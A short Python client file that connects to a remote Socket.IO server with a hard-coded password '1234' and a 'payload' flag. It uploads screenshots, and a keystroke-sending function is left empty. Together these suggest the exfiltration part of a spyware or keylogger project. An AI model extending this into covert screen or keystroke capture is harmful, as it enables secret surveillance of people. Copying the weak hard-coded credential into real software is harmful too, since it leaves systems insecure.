import base64
import socketio
import requests
from socketio.exceptions import BadNamespaceError


class Server:
    def __init__(self, URL):
        self.URL = URL
        self.sio = socketio.Client()
        self.sio.connect(URL, auth={"password": "1234", "payload": True})
        self.register_handlers()


    def send_screenshot(self, file):
        file.seek(0)
        myobj = {'file': file}
        file_bytes = file.read()
        try:
            self.sio.emit('upload_screenshot', file_bytes)
        except BadNamespaceError:
            print("I guess the server is down...")
        print("Sent screenshot")
        """
        #make a POST request to my_server
        print("sending screenshooots!")
        file.seek(0)
        #files_string = base64.b64encode(file.read()).decode("utf-8")
        myobj = {'file': file}
        headers = {
            "Authorization": "Bearer {'api_key'}",  # Secure token-based authentication
            "Device-ID": 'some random device id'  # Custom header for the device ID
        }

        try:
            response = requests.post(self.URL, files = myobj, headers=headers)
            print(f"Server Response: {response.text}")
        except Exception as e:
            print("Some exception:")
            print(e)
            pass
        """


    def send_keystrokes(self):
        pass

    def register_handlers(self):
        @self.sio.on('connect')
        def connected():
            print("Wohoo connected or smth")



class ServerWithSocketIO:
    pass